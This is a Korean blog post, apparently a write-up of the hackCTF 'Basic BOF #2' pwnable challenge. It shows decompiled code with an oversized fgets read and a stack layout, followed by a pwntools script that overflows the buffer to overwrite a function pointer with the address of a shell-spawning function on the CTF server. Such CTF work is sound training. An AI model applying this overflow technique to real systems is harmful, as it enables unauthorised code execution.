---
layout: post
title:  "[hackCTF]Basic BOF #2"
date:   2020-02-09
categories: hackCTF/pwnable
tags: [hackCTF] [pwnable]
permalink: 'hackCTF/pwnable'
---

hackCTF pwnable 2번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida - main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-8Ch]
  void (*v5)(void); // [esp+8Ch] [ebp-Ch]

  v5 = (void (*)(void))sup; // sup 함수의 주소를 v5에 저장
  fgets(&s, 133, stdin); // stdin으로부터 133바이트를 입력 받아 s에 저장
  v5(); // v5가 가리키는 함수 실행
  return 0;
}
```
## ida - sup
```c
int sup()
{
  return puts(&s); // s에 저장된 문자열 출력
}
```

## ida - shell
```c
int shell()
{
  return system("/bin/dash"); // 쉘을 띄울 수 있다!
}
```
<br>

메모리 구조를 정리해보자.<br><br>

***

| sfp |    ebp   |
|:---:|:--------:|
| ... |          |
|  v5 | esp+0x8C |
| ... |          |
|  s  |  esp+0xC |
| ... |          |
| esp |   esp+0  |

***

<br>
목표 : shell 함수 실행 <br>
취약점 : fgets(&s, 133, stdin)<br><br>
∴ v5를 shell의 주소로 덮어 shell()을 실행시키자.<br><br><br>

+) 쉘의 주소는 다음과 같다.  
![0201](https://drive.google.com/uc?id=18Rgv1QIq_0rxABl08a1KZjNBc3GLtHi4)


## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3001)

payload = "A"*(0x8C-0xC) + p32(0x0804849B)

p.sendline(payload)

p.interactive()
```
## 결과  
![0202](https://drive.google.com/uc?id=1GApVrN8IkoCUKXN559Ldluu8rjXOXgtH)
